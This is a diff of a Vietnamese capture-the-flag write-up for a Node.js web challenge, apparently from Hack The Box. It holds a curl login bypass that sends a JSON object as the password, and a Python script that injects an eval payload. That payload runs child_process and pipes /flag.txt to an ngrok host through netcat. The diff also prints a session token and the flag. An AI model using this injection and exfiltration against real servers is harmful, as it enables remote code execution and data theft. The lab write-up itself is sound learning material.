@@ -321,9 +321,28 @@ SELECT username FROM users WHERE username = 'admin' AND password = `password` = 
 ```
 Bypassed!!
 
-**Sau khi login ta được cookies**:
+**Lấy cookies**:
+```bash
+curl 'http://159.65.19.24:30081/api/login' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.9,vi;q=0.8' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/json' \
+  -H 'Origin: http://localhost:1337' \
+  -H 'Referer: http://localhost:1337/' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36' \
+  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Linux"' \
+  --data-raw '{"username":"admin","password":{"password": "1"}}' \
+  --compressed -v
 ```
-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjUyOTc3Mzk4fQ.UwNx5sZlYOKO2TxS_l2lqO2WN_iYEzzc8cBOI06Ud8c
+**Ta được cookies**: 
+```
+session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjU0MTg3Njk1fQ.jv0_P_Kaek5GG0PncV9FlZz_0C_twsqkGyyqNhGeShI;
 ```
 Kiến thức mới!!!
 
@@ -345,30 +364,44 @@ const calculate = (activity, health, weight, happiness) => {
 
 ```python
 import requests
+from base64 import b64encode
 
-url = 'http://ip:port/'
-#s = requests.Session()
-
-header = b'{"alg":"none","typ":"JWT"}'
-payload = b'{"username":"admin"}'
+url = 'http://159.65.19.24:30081/'
 
 cookies = {
-    'session':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjUyOTc3Mzk4fQ.UwNx5sZlYOKO2TxS_l2lqO2WN_iYEzzc8cBOI06Ud8c'
+	'session': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjU0MTg3Njk1fQ.jv0_P_Kaek5GG0PncV9FlZz_0C_twsqkGyyqNhGeShI'
 }
 
-# https://whitehat.vn/threads/khai-thac-lo-hong-remote-code-execution-rce-trong-nodejs-phan-1.14697/
-payload = "a', a=(eval(\"global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt|nc ngrok.io 1234')\")), b='a"
+headers = {
+	'Accept': '*/*',
+	'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+	'Connection': 'keep-alive',
+	'Content-Type': 'application/json',
+	'Origin': 'http://localhost:1337',
+	'Referer': 'http://localhost:1337/',
+	'Sec-Fetch-Dest': 'empty',
+	'Sec-Fetch-Mode': 'cors',
+	'Sec-Fetch-Site': 'same-origin',
+	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
+	'sec-ch-ua': 'Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
+	'sec-ch-ua-mobile': '?0',
+	'sec-ch-ua-platform': 'Linux',
+}
+
+payload = "a', a=(eval(\"global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt|nc 0.tcp.ap.ngrok.io 19840')\")), b='a"
 
 data = {
-    'activity': payload,
-    'health': '1',
-    'weight': '1',
-    'happiness': '1',
+	'activity': payload,
+	'health': '1',
+	'weight': '1',
+	'happiness': '1',
 }
 
-r = requests.post(url+'api/activity', data=data, cookies=cookies, allow_redirects=False)
+r = requests.post(url+'api/activity', json=data, cookies=cookies, allow_redirects=False, headers=headers)
 
 print(r.text)
+
+# HTB{s0rry_1m_n07_1nt0_typ3_ch3ck5}
 ```
 
 **flag**: `pass`
